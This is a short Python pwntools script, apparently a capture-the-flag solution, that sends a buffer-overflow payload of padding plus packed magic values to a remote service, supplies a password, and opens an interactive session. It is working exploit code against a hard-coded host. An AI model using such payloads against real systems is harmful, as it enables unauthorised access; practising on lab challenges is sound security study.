#!/usr/bin/env python2

from pwn import *

p = remote('140.110.112.192', 2111)

payload = 'A' * 12 + p32(0xfaceb00c) + p32(0xdeadbeef) + p32(0x12345678)
p.sendlineafter('What do you want to tell me:\n', payload)
p.sendlineafter('password:', '305419896')

p.interactive()
p.close()
